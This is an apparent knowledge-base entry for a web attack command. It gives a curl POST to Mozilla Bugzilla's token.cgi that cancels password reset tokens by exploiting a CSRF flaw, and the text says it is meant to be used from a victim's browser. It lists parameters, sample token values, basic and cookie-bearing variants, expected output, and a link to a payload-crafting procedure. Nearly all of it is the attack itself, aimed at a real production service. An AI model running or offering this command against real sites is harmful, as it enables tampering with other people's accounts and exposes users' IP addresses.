---
data: >-
  curl -X POST https://bugzilla.mozilla.org/token.cgi -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'cancel_token=1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI&t=3XOIDGIRtcwC3icniucOlm&a=cxlpw&cancel=Cancel'
tags:
  - csrf
  - web-exploit
  - http-post
type: command
output: >-
  HTTP/2 200 OK with redirection or success message; triggers email to account
  owner.
executor: curl
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.415Z'
id: 6a60b6da-ca3f-4523-aeb8-36584baccfa9
verified: false
validated: true
submitted: true
---
# Cancel-Bugzilla-Password-Reset-Token

## Command

```bash
curl -X POST https://bugzilla.mozilla.org/token.cgi \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'cancel_token=1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI&t=3XOIDGIRtcwC3icniucOlm&a=cxlpw&cancel=Cancel'
```

## Description

This curl command simulates the POST request to cancel a Bugzilla password reset token, exploiting the CSRF vulnerability to trigger an email with the requester's IP address. Use in a CSRF context from the victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cancel_token` | The reset token to cancel (e.g., 1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI) | Yes |
| `t` | Timestamp or session parameter (e.g., 3XOIDGIRtcwC3icniucOlm) | Yes |
| `a` | Action parameter (cxlpw for cancel password) | Yes |
| `cancel` | Trigger value (Cancel) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://bugzilla.mozilla.org/token.cgi -H 'Content-Type: application/x-www-form-urlencoded' -d 'cancel_token=YOUR_TOKEN&t=YOUR_T&a=cxlpw&cancel=Cancel'
```

### Advanced Usage

Add cookies or headers for authenticated simulation:

```bash
curl -X POST https://bugzilla.mozilla.org/token.cgi \
  -H 'Cookie: your_session_cookie' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'cancel_token=YOUR_TOKEN&t=YOUR_T&a=cxlpw&cancel=Cancel'
```

## Expected Output

Server responds with a 302 redirect or HTML confirmation of cancellation. Critically, an email is sent to the account owner including the IP address of the machine that made the request.

## Related

- [[Related Procedure: Craft-CSRF-Payload-for-Reset-Cancellation]]
